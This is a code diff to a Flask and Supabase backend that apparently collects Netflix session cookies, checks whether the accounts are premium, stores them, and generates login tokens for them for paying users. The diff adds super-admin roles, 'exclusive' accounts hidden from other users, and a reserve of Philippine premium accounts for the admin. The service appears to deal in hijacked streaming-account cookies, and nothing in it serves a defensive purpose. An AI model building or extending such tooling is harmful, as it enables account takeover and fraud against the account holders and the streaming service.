@@ -26,6 +26,7 @@ import secrets
 from marshmallow import Schema, fields, validate, ValidationError
 from flask import Flask, session
 from datetime import timedelta
+from functools import wraps
 
 
 load_dotenv()
@@ -83,6 +84,8 @@ TEMP_DIR = "/tmp"
 SUPABASE_URL = os.environ.get('SUPABASE_URL', 'your-supabase-url')
 SUPABASE_SERVICE_KEY = os.environ.get('SUPABASE_SERVICE_KEY', 'your-service-role-key')
 SUPABASE_ANON_KEY = os.environ.get('SUPABASE_ANON_KEY', 'your-anon-key')
+SUPER_ADMIN_EMAILS = os.environ.get('SUPER_ADMIN_EMAILS', '').split(',')
+SUPER_ADMIN_IDS = os.environ.get('SUPER_ADMIN_IDS', '').split(',')
 
 required_env = ['SUPABASE_URL', 'SUPABASE_SERVICE_KEY', 'SUPABASE_ANON_KEY']
 missing = [var for var in required_env if not os.environ.get(var)]
@@ -630,9 +633,12 @@ def check_premium_status(user_id):
         logger.error(f"Error checking premium status: {e}")
         return False  # Fail-safe: assume not premium on error
 
-def store_netflix_account(email, netflix_id, subscription_type, country, plan, cookie_content, user_id, signup_country=None, detection_method=None):
+def store_netflix_account(email, netflix_id, subscription_type, country, plan, 
+                         cookie_content, user_id, signup_country=None, 
+                         detection_method=None, is_exclusive=False, 
+                         reserved_for_admin=False):
+    """Store account with exclusive access flags"""
     try:
-        # CRITICAL: Create fresh options with service role key to bypass RLS
         from supabase.lib.client_options import ClientOptions
         
         options = ClientOptions(
@@ -642,10 +648,10 @@ def store_netflix_account(email, netflix_id, subscription_type, country, plan, c
             }
         )
         
-        # Create temporary admin client
         admin_client = create_client(SUPABASE_URL, SUPABASE_SERVICE_KEY, options=options)
         
-        existing = admin_client.table('netflix_accounts').select('id').eq('email', email).execute()
+        # Check if super admin is adding this account
+        adding_user_is_admin = is_super_admin(user_id)
         
         account_data = {
             'email': email,
@@ -659,8 +665,12 @@ def store_netflix_account(email, netflix_id, subscription_type, country, plan, c
             'added_by': str(user_id),
             'last_checked': datetime.utcnow().isoformat(),
             'is_active': True,
-            'detection_method': detection_method
+            'detection_method': detection_method,
+            'exclusive_access': is_exclusive if adding_user_is_admin else False,
+            'reserved_for_super_admin': reserved_for_admin if adding_user_is_admin else False
         }
+        
+        existing = admin_client.table('netflix_accounts').select('id').eq('email', email).execute()
         
         if existing.data:
             account_id = existing.data[0]['id']
@@ -785,6 +795,18 @@ def login():
         
         profile = supabase.table('user_profiles').select('*').eq('id', auth_response.user.id).single().execute()
         
+        # Check if this user should be super admin based on env vars
+        is_admin = (email in SUPER_ADMIN_EMAILS or 
+                   str(auth_response.user.id) in SUPER_ADMIN_IDS or
+                   profile.data.get('is_super_admin', False))
+        
+        # Update profile if env var match but DB flag not set
+        if is_admin and not profile.data.get('is_super_admin', False):
+            supabase.table('user_profiles').update({
+                'is_super_admin': True,
+                'role': 'super_admin'
+            }).eq('id', auth_response.user.id).execute()
+        
         return jsonify({
             'status': 'success',
             'session': {
@@ -795,7 +817,9 @@ def login():
             'user': {
                 'id': auth_response.user.id,
                 'email': auth_response.user.email,
-                'is_premium': profile.data.get('is_premium', False) if profile.data else False
+                'is_premium': profile.data.get('is_premium', False),
+                'is_super_admin': is_admin,
+                'role': 'super_admin' if is_admin else profile.data.get('role', 'user')
             }
         })
     except AuthApiError as e:
@@ -871,9 +895,18 @@ def check_cookie(user):
             })
         
         is_premium_user = check_premium_status(user.id)
+        is_admin = is_super_admin(user.id)
+        
+        # Store account - check if it should be exclusive (PH premium accounts auto-exclusive)
+        is_ph_premium = (account_info["country"] == "PH" and 
+                        account_info["premium"] and 
+                        "Premium" in account_info.get("plan", ""))
         
         account_db_id = None
         if account_info["ok"] and account_info["premium"]:
+            # Only super admins can create exclusive accounts
+            can_be_exclusive = is_admin and is_ph_premium
+            
             success, db_record = store_netflix_account(
                 email=account_info["email"],
                 netflix_id=netflix_id,
@@ -882,12 +915,13 @@ def check_cookie(user):
                 plan=account_info["plan"],
                 cookie_content=content,
                 user_id=user.id,
-                signup_country=account_info.get("signup_country"),  # Where created
-                detection_method=account_info.get("detection_method")  # How detected
+                signup_country=account_info.get("signup_country"),
+                detection_method=account_info.get("detection_method"),
+                is_exclusive=can_be_exclusive,
+                reserved_for_admin=can_be_exclusive
             )
             if success and db_record:
                 account_db_id = db_record.get('id')
-                logger.info(f"Stored account {account_info['email']} in database with ID: {account_db_id}")
         
         if mode == 'generate_token' and not is_premium_user:
             return jsonify({
@@ -895,6 +929,7 @@ def check_cookie(user):
                 "message": "Premium subscription required to generate tokens"
             }), 403
         
+        # Rest of your existing code...
         if mode == 'check_only':
             if account_db_id:
                 log_token_generation(
@@ -903,7 +938,6 @@ def check_cookie(user):
                     ip_address=request.remote_addr,
                     token=None
                 )
-                logger.info(f"Logged check for account {account_db_id}")
             
             return jsonify({
                 "status": "success",
@@ -914,7 +948,8 @@ def check_cookie(user):
                     "is_premium": account_info["premium"],
                     "subscription_type": account_info["subscription_type"],
                     "mode": "check_only",
-                    "stored_in_db": account_info["ok"] and account_info["premium"]
+                    "stored_in_db": account_info["ok"] and account_info["premium"],
+                    "is_exclusive": is_ph_premium and not is_admin  # Flag if user can't access it later
                 }
             })
         
@@ -933,7 +968,6 @@ def check_cookie(user):
                 ip_address=request.remote_addr,
                 token=token_result["token"]
             )
-            logger.info(f"Logged token generation for account {account_db_id}")
         
         return jsonify({
             "status": "success",
@@ -1154,37 +1188,57 @@ def get_accounts(user):
         
     try:
         is_premium = check_premium_status(user.id)
+        is_admin = is_super_admin(user.id)
         
-        if not is_premium:
+        if not is_premium and not is_admin:
             return jsonify({
                 "status": "error",
                 "message": "Premium subscription required to view accounts"
             }), 403
         
-        accounts = supabase.table('netflix_accounts')\
-            .select('*')\
-            .eq('is_active', True)\
-            .eq('is_premium', True)\
-            .order('created_at', desc=True)\
-            .execute()
+        # Build query based on permissions
+        query = get_accounts_query(user.id, is_premium, is_admin)
         
-        logger.info(f"Found {len(accounts.data) if accounts.data else 0} accounts for user {user.id}")
+        # Add filters from query params
+        country_filter = request.args.get('country')
+        if country_filter and not is_admin:
+            query = query.eq('country', country_filter)
         
+        query = query.order('created_at', desc=True)
+        accounts = query.execute()
+        
+        # Log PH accounts count for monitoring
+        if is_admin:
+            ph_count = ensure_ph_accounts_pool()
+            logger.info(f"Super admin {user.id} accessed accounts. PH pool: {ph_count}")
+        
+        # Format response
         safe_accounts = []
-        for acc in accounts.data:
-            safe_accounts.append({
+        for acc in accounts.data or []:
+            account_data = {
                 'id': acc['id'],
                 'email': acc['email'],
                 'subscription_type': acc['subscription_type'],
                 'country': acc['country'],
                 'plan': acc['plan'],
                 'created_at': acc['created_at'],
-                'last_checked': acc['last_checked']
-            })
+                'last_checked': acc['last_checked'],
+                'is_exclusive': acc.get('exclusive_access', False),
+                'reserved_for_super_admin': acc.get('reserved_for_super_admin', False)
+            }
+            
+            # Only show exclusive flags to super admin
+            if not is_admin:
+                account_data.pop('is_exclusive', None)
+                account_data.pop('reserved_for_super_admin', None)
+            
+            safe_accounts.append(account_data)
         
         return jsonify({
             "status": "success",
-            "accounts": safe_accounts
+            "accounts": safe_accounts,
+            "is_super_admin": is_admin,
+            "total_count": len(safe_accounts)
         })
         
     except Exception as e:
@@ -1193,6 +1247,75 @@ def get_accounts(user):
         logger.error(traceback.format_exc())
         return jsonify({"status": "error", "message": str(e)})
 
+@app.route('/api/accounts/exclusive', methods=['GET', 'OPTIONS'])
+@cross_origin(supports_credentials=True)
+@require_super_admin
+def get_exclusive_accounts(user):
+    """Get accounts reserved for super admin only"""
+    if request.method == 'OPTIONS':
+        return '', 204
+    
+    try:
+        accounts = supabase.table('netflix_accounts')\
+            .select('*')\
+            .or_('exclusive_access.eq.true,reserved_for_super_admin.eq.true')\
+            .eq('is_active', True)\
+            .order('created_at', desc=True)\
+            .execute()
+        
+        # Ensure PH accounts minimum
+        ph_accounts = [a for a in (accounts.data or []) if a.get('country') == 'PH']
+        other_accounts = [a for a in (accounts.data or []) if a.get('country') != 'PH']
+        
+        return jsonify({
+            "status": "success",
+            "ph_accounts": {
+                "count": len(ph_accounts),
+                "accounts": ph_accounts[:20]  # Limit for performance
+            },
+            "other_exclusive": other_accounts[:20],
+            "ph_minimum_met": len(ph_accounts) >= 8,
+            "is_super_admin": True
+        })
+        
+    except Exception as e:
+        logger.error(f"Error getting exclusive accounts: {e}")
+        return jsonify({"status": "error", "message": str(e)}), 500
+
+@app.route('/api/accounts/<account_id>/set-exclusive', methods=['POST', 'OPTIONS'])
+@cross_origin(supports_credentials=True)
+@require_super_admin
+def set_account_exclusive(user, account_id):
+    """Mark an account as exclusive/super-admin-only"""
+    if request.method == 'OPTIONS':
+        return '', 204
+    
+    try:
+        data = request.get_json()
+        is_exclusive = data.get('exclusive_access', False)
+        reserved_for_admin = data.get('reserved_for_super_admin', False)
+        
+        result = supabase.table('netflix_accounts')\
+            .update({
+                'exclusive_access': is_exclusive,
+                'reserved_for_super_admin': reserved_for_admin,
+                'updated_at': datetime.utcnow().isoformat()
+            })\
+            .eq('id', account_id)\
+            .execute()
+        
+        if result.data:
+            return jsonify({
+                "status": "success",
+                "message": "Account exclusivity updated",
+                "account": result.data[0]
+            })
+        else:
+            return jsonify({"status": "error", "message": "Account not found"}), 404
+            
+    except Exception as e:
+        logger.error(f"Error setting exclusivity: {e}")
+        return jsonify({"status": "error", "message": str(e)}), 500
 @app.route('/api/accounts/<account_id>/generate-token', methods=['POST', 'OPTIONS'])
 @cross_origin(supports_credentials=True)
 @require_auth
@@ -1360,3 +1483,82 @@ def cron_validate_accounts():
     except Exception as e:
         logger.error(f"Cron job failed: {e}")
         return jsonify({'status': 'error', 'message': str(e)}), 500
+
+def is_super_admin(user_id):
+    """Check if user is super admin"""
+    if not user_id:
+        return False
+    
+    # Check environment variable list first
+    if str(user_id) in SUPER_ADMIN_IDS:
+        return True
+    
+    try:
+        result = supabase.table('user_profiles')\
+            .select('is_super_admin, role')\
+            .eq('id', str(user_id))\
+            .single()\
+            .execute()
+        
+        if result.data:
+            return result.data.get('is_super_admin', False) or result.data.get('role') == 'super_admin'
+        return False
+    except Exception as e:
+        logger.error(f"Error checking super admin: {e}")
+        return False
+
+def require_super_admin(f):
+    """Decorator to require super admin access"""
+    @wraps(f)
+    def decorated_function(*args, **kwargs):
+        auth_header = request.headers.get('Authorization')
+        if not auth_header or not auth_header.startswith('Bearer '):
+            return jsonify({'status': 'error', 'message': 'Authentication required'}), 401
+        
+        token = auth_header.split(' ')[1]
+        try:
+            user = supabase.auth.get_user(token)
+            if not user or not is_super_admin(user.user.id):
+                return jsonify({'status': 'error', 'message': 'Super admin access required'}), 403
+            return f(user.user, *args, **kwargs)
+        except Exception as e:
+            logger.error(f"Super admin check error: {e}")
+            return jsonify({'status': 'error', 'message': 'Invalid token'}), 401
+    
+    return decorated_function
+
+def get_accounts_query(user_id, is_premium=False, is_admin=False):
+    """Build query based on user permissions"""
+    query = supabase.table('netflix_accounts').select('*')
+    
+    if is_admin:
+        # Super admin sees everything including exclusive accounts
+        return query
+    
+    # Regular premium users - exclude exclusive/super-admin-only accounts
+    query = query.eq('is_active', True).eq('is_premium', True)
+    query = query.or_('exclusive_access.eq.false,reserved_for_super_admin.eq.false')
+    
+    return query
+
+def ensure_ph_accounts_pool():
+    """Ensure at least 8 PH premium accounts exist for super admin"""
+    try:
+        # Check current PH accounts count
+        result = supabase.table('netflix_accounts')\
+            .select('*', count='exact')\
+            .eq('country', 'PH')\
+            .eq('is_premium', True)\
+            .eq('is_active', True)\
+            .execute()
+        
+        current_count = result.count if hasattr(result, 'count') else len(result.data or [])
+        
+        if current_count < 8:
+            logger.warning(f"PH accounts pool low: {current_count}/8. Super admin should add more.")
+            # You could trigger notifications here
+        
+        return current_count
+    except Exception as e:
+        logger.error(f"Error checking PH accounts pool: {e}")
+        return 0
